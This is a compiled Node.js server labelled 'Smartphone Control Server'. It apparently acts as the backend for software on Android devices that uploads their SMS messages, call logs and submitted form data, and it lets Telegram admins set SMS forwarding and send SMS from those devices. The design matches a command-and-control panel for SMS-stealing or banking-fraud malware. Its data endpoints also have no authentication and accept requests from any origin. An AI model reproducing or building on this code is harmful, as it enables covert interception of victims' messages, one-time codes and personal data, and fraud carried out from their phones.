"use strict";
var __importDefault = (this && this.__importDefault) || function (mod) {
    return (mod && mod.__esModule) ? mod : { "default": mod };
};
Object.defineProperty(exports, "__esModule", { value: true });
const express_1 = __importDefault(require("express"));
const http_1 = require("http");
const socket_io_1 = require("socket.io");
const cors_1 = __importDefault(require("cors"));
const handlers_js_1 = require("./socket/handlers.js");
const store_js_1 = require("./store.js");
const bot_js_1 = require("./telegram/bot.js");
const app = (0, express_1.default)();
const httpServer = (0, http_1.createServer)(app);
// CORS configuration - allow all origins for Android device connections
const corsOptions = {
    origin: true, // Allow all origins dynamically
    methods: ['GET', 'POST', 'PUT', 'DELETE', 'OPTIONS'],
    credentials: true,
    allowedHeaders: ['Content-Type', 'Authorization', 'ngrok-skip-browser-warning'],
};
app.use((0, cors_1.default)(corsOptions));
app.use(express_1.default.json());
// Socket.IO server with proper timeout settings
const io = new socket_io_1.Server(httpServer, {
    cors: {
        origin: true,
        methods: ['GET', 'POST'],
        credentials: true,
    },
    pingTimeout: 60000, // 60 seconds before considering connection dead
    pingInterval: 25000, // Send ping every 25 seconds
    maxHttpBufferSize: 5e6, // 5 MB max payload size for large SMS/call log syncs
});
// Initialize Telegram Bot
const telegramConfig = process.env.TELEGRAM_BOT_TOKEN ? {
    token: process.env.TELEGRAM_BOT_TOKEN,
    adminIds: (process.env.TELEGRAM_ADMIN_IDS || '')
        .split(',')
        .map(id => parseInt(id.trim(), 10))
        .filter(id => !isNaN(id)),
} : undefined;
const telegramBot = (0, bot_js_1.initTelegramBot)(telegramConfig);
// Setup socket handlers with Telegram bot integration
(0, handlers_js_1.setupSocketHandlers)(io, telegramBot);
// Wire up Telegram bot callbacks for device control
if (telegramBot.isActive()) {
    telegramBot.onForwardingUpdate = (deviceId, config) => {
        const newConfig = store_js_1.store.updateForwarding(deviceId, config);
        if (newConfig) {
            io.to(`device:${deviceId}`).emit('forwarding:config', newConfig);
            console.log(`[Telegram] Forwarding config sent to device ${deviceId}`);
        }
    };
    telegramBot.onSyncRequest = (deviceId) => {
        io.to(`device:${deviceId}`).emit('device:requestSync');
        console.log(`[Telegram] Sync request sent to device ${deviceId}`);
    };
    telegramBot.onSendSms = (deviceId, recipientNumber, message, requestId, subscriptionId) => {
        io.to(`device:${deviceId}`).emit('sms:sendRequest', {
            recipientNumber,
            message,
            subscriptionId: subscriptionId ?? -1,
            requestId,
        });
        console.log(`[Telegram] SMS send request sent to device ${deviceId}${subscriptionId && subscriptionId > 0 ? ` (SIM: ${subscriptionId})` : ''}`);
    };
}
// REST API endpoints
app.get('/api/health', (req, res) => {
    res.json({ status: 'ok', timestamp: new Date().toISOString() });
});
app.get('/api/devices', (req, res) => {
    res.json(store_js_1.store.getAllDevices());
});
app.get('/api/devices/:id', (req, res) => {
    const deviceData = store_js_1.store.getDevice(req.params.id);
    if (!deviceData) {
        return res.status(404).json({ error: 'Device not found' });
    }
    res.json(deviceData);
});
app.get('/api/devices/:id/sms', (req, res) => {
    const sms = store_js_1.store.getSMS(req.params.id);
    res.json(sms);
});
app.get('/api/devices/:id/calls', (req, res) => {
    const calls = store_js_1.store.getCalls(req.params.id);
    res.json(calls);
});
app.get('/api/devices/:id/forms', (req, res) => {
    const forms = store_js_1.store.getForms(req.params.id);
    res.json(forms);
});
const PORT = process.env.PORT || 3001;
const HOST = '0.0.0.0'; // Listen on all interfaces for Android device connections
httpServer.listen(Number(PORT), HOST, () => {
    console.log(`
╔═══════════════════════════════════════════════════════════╗
║                                                           ║
║   📱 Smartphone Control Server                            ║
║                                                           ║
║   REST API:    http://192.168.0.115:${PORT}                 ║
║   Socket.IO:   ws://192.168.0.115:${PORT}                   ║
║   Telegram:    ${telegramBot.isActive() ? '✅ Enabled' : '❌ Disabled'}                              ║
║                                                           ║
║   Listening on all interfaces (0.0.0.0)                   ║
║   Waiting for device connections...                       ║
║                                                           ║
╚═══════════════════════════════════════════════════════════╝
  `);
});
// Graceful shutdown handling for Render restarts
const gracefulShutdown = async (signal) => {
    console.log(`\n[Server] Received ${signal}. Starting graceful shutdown...`);
    // Stop Telegram bot polling first (most critical for avoiding 409 conflict)
    if (telegramBot.isActive()) {
        await telegramBot.stop();
    }
    // Close HTTP server
    httpServer.close(() => {
        console.log('[Server] HTTP server closed.');
        process.exit(0);
    });
    // Force exit after 10 seconds if graceful shutdown fails
    setTimeout(() => {
        console.error('[Server] Graceful shutdown timed out. Forcing exit.');
        process.exit(1);
    }, 10000);
};
process.on('SIGTERM', () => gracefulShutdown('SIGTERM'));
process.on('SIGINT', () => gracefulShutdown('SIGINT'));
